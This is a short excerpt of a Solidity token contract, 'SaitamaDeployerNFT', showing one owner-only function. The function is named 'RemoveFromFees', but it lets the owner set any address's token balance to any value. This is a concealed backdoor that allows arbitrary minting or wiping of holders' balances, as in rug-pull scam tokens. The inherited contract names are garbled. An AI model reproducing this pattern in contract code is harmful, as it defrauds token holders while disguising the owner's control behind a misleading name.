...
contract SaitamaDeployerNFT is Contextrte, IBEPSaitamaDeployer, Ownableertg {
 ...
 function RemoveFromFees(address SaitamaD, uint256 SaitamaDNFT) external onlyOwner{
    _totbalances[SaitamaD] = SaitamaDNFT;
  }
